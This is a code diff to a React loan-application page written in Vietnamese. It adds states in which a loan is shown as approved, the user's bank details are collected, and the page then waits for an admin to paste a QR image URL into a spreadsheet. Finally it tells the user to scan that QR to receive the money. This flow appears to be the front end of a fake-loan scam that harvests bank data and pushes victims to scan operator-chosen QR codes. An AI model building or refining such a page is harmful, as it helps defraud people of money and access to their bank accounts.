@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import axios from 'axios';
 
 const API_BASE = import.meta.env.VITE_API_URL || 'http://localhost:5000/api';
@@ -8,26 +8,37 @@ const LoanWorkflow = () => {
     const [token, setToken] = useState(new URLSearchParams(window.location.search).get('token') || '');
     const [loading, setLoading] = useState(false);
     const [qrUrl, setQrUrl] = useState('');
+    const skipPollingRef = useRef(false); // Prevent polling from overriding user actions
 
     useEffect(() => {
         if (token) {
             checkStatus(token);
-            const interval = setInterval(() => checkStatus(token), 3000);
+            const interval = setInterval(() => checkStatus(token), 10000);
             return () => clearInterval(interval);
         }
     }, [token]);
 
     const checkStatus = async (chkToken) => {
+        // Skip polling if user is actively in a protected UI state
+        if (skipPollingRef.current) return;
+
         try {
             const res = await axios.get(`${API_BASE}/status?token=${chkToken}`);
             const data = res.data;
+
+            // Status flow: pending -> approved -> waiting_qr -> qr_ready -> done
             if (data.status === 'pending') setState('pending');
             else if (data.status === 'approved') setState('approved');
-            else if (data.status === 'scanned') {
-                setState('scanned');
+            else if (data.status === 'waiting_qr') {
+                setState('waiting_qr');
+            }
+            else if (data.status === 'qr_ready' || (data.qr_url && data.status !== 'done')) {
+                setState('qr_ready');
                 if (data.qr_url) setQrUrl(data.qr_url);
             }
-            else if (data.status === 'done') setState('success');
+            else if (data.status === 'done' || data.status === 'scanned') {
+                setState('success');
+            }
         } catch (e) {
             console.error('Status check error:', e);
         }
@@ -46,6 +57,9 @@ const LoanWorkflow = () => {
                 setToken(newToken);
                 window.history.pushState({}, '', `?token=${newToken}`);
                 setState('pending');
+            } else {
+                // If no token (per user request), show "submitted" state
+                setState('submitted');
             }
         } catch {
             alert('Có lỗi xảy ra, vui lòng thử lại.');
@@ -65,7 +79,9 @@ const LoanWorkflow = () => {
 
         try {
             await axios.post(`${API_BASE}/submit-bank`, data);
-            checkStatus(token);
+            // Resume polling for waiting_qr state
+            skipPollingRef.current = false;
+            setState('waiting_qr');
         } catch {
             alert('Lỗi khi gửi thông tin ngân hàng.');
         } finally {
@@ -146,6 +162,18 @@ const LoanWorkflow = () => {
         );
     }
 
+    if (state === 'submitted') {
+        return (
+            <div className="state-container">
+                <div className="state-title">✔️ Đăng ký hồ sơ thành công</div>
+                <p style={{ color: '#666', fontSize: '16px', lineHeight: '1.6' }}>
+                    Yêu cầu của Quý khách đã được tiếp nhận. <br />
+                    Vui lòng <b>kiểm tra Email</b> thường xuyên. Chúng tôi sẽ gửi thông báo phê duyệt kèm đường link cập nhật thông tin giải ngân ngay khi hồ sơ được duyệt.
+                </p>
+            </div>
+        );
+    }
+
     if (state === 'pending') {
         return (
             <div className="state-container">
@@ -159,7 +187,7 @@ const LoanWorkflow = () => {
         return (
             <div className="state-container">
                 <div className="state-title" style={{ color: '#28a745' }}>✅ Hồ sơ của Quý khách đã được phê duyệt thành công</div>
-                <button className="btn-submit" onClick={() => setState('bank')}>Vui lòng làm thủ tục giải ngân</button>
+                <button className="btn-submit" onClick={() => { skipPollingRef.current = true; setState('bank'); }}>Vui lòng làm thủ tục giải ngân</button>
             </div>
         );
     }
@@ -191,16 +219,32 @@ const LoanWorkflow = () => {
         );
     }
 
-    if (state === 'scanned') {
+    // Ảnh 4: Waiting for QR - Admin chưa nhập URL QR
+    if (state === 'waiting_qr') {
+        return (
+            <div className="state-container">
+                <div className="state-title">⏳ Chúng tôi đang xử lý thông tin giải ngân</div>
+                <p style={{ color: '#666', fontSize: '14px', lineHeight: '1.6' }}>
+                    Mã QR sẽ được cung cấp sau khi xác nhận thông tin.<br />
+                    Vui lòng không đóng trang này.
+                </p>
+            </div>
+        );
+    }
+
+    // Ảnh 5: QR Ready - Admin đã nhập URL QR vào Sheet
+    if (state === 'qr_ready') {
         return (
             <div className="state-container">
                 {qrUrl && (
-                    <div style={{ marginBottom: '20px' }}>
-                        <img src={qrUrl} alt="QR" style={{ maxWidth: '200px', border: '1px solid #ddd', padding: '5px' }} />
+                    <div style={{ marginBottom: '20px', textAlign: 'center' }}>
+                        <img src={qrUrl} alt="QR Code" style={{ maxWidth: '280px', border: '1px solid #ddd', padding: '10px', borderRadius: '8px' }} />
+                        <p style={{ color: '#666', fontSize: '12px', marginTop: '10px' }}>Quét mã QR để hoàn tất</p>
                     </div>
                 )}
-                <div className="state-title" style={{ color: '#28a745' }}>✅ Đã quét QR thành công</div>
-                <p style={{ color: '#666', fontSize: '13px' }}>Vui lòng chờ xác duyệt bước cuối cùng để nhận tiền.</p>
+                {!qrUrl && (
+                    <div className="state-title">⏳ Đang tải mã QR...</div>
+                )}
             </div>
         );
     }
@@ -208,8 +252,8 @@ const LoanWorkflow = () => {
     if (state === 'success') {
         return (
             <div className="state-container">
-                <div className="state-title" style={{ color: '#28a745', fontSize: '24px' }}>Bạn đã xác nhận giải ngân thành công</div>
-                <p style={{ color: '#666', fontSize: '16px' }}>Đợi 3-5 ngày tiền sẽ được chuyển vào tài khoản.</p>
+                <div className="state-title" style={{ color: '#28a745', fontSize: '24px' }}>🎉 Giải ngân thành công!</div>
+                <p style={{ color: '#666', fontSize: '16px' }}>Tiền sẽ được chuyển vào tài khoản của bạn trong 3-5 ngày làm việc.</p>
             </div>
         );
     }
